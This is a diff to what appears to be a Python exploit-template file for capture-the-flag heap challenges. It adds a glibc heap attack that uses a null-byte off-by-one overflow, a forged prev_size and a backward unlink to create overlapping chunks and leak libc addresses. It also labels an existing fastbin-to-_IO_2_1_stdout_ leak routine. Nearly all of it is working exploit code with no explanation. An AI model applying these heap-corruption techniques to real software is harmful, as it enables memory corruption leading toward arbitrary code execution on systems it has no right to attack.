@@ -1,3 +1,7 @@
+
+'''
+fastbin to IO_STDOUT
+'''
 def exploit():
 	add(0x88, 'a'*0x10)			#0
 	add(0x218, 'b'*0x10)		#1
@@ -46,3 +50,25 @@ def exploit():
 
 	  	libc_base = leak - libc.symbols['_IO_2_1_stdin_']	# or __IO_file_jumps
 	  	print "libc_base ==> " + hex(libc_base)
+
+
+'''
+we can show()
+add will null-by-one
+'''
+def exploit():
+	for i in range(2):
+		add(0x100, 'a'*0x10)
+	add(0x68, 'b')
+	add(0x68, 'c')
+
+	add(0x100, '\x00'*0xf0 + p64(0x100) + p64(0x11))
+	free(2)
+	free(3)
+	free(0)								#so fd, bk is satifid with unlink
+
+	add(0x68, 'a'*0x60 + p64(0x300))	#fake 4' pre_size=0x300, in_use=0
+	free(4)								#unlink 0, 1, 2, 3
+
+	add(0x100, 'a'*0x10)
+	show(1)
